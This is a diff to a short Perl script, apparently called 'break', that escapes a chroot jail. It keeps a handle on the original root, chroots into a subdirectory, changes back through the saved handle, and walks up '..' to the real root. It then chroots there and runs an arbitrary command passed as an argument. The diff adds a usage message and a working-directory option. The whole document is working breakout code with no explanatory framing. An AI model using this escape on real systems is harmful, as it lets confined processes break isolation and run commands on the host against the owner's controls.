@@ -1,13 +1,19 @@
 #!/usr/bin/perl -w
 
+if (@ARGV <= 1)
+{
+  print "usage: ./break <cmd> <cwd>\n";
+  exit;
+}
 chdir "/";
-opendir JAILROOT, "." or die "file handle err\n";
+opendir JAILROOT, "." or die "jrfh err\n";
 mkdir "sub";
 chdir "sub";
 chroot ".";
-chdir(*JAILROOT);
+chdir *JAILROOT;
 while ((stat("."))[0] != (stat(".."))[0] or (stat("."))[1] != (stat(".."))[1]) {
         chdir "..";
 }
 chroot ".";
-print `$ARGV[0]`
+chdir "$ARGV[1]";
+print `$ARGV[0]`;
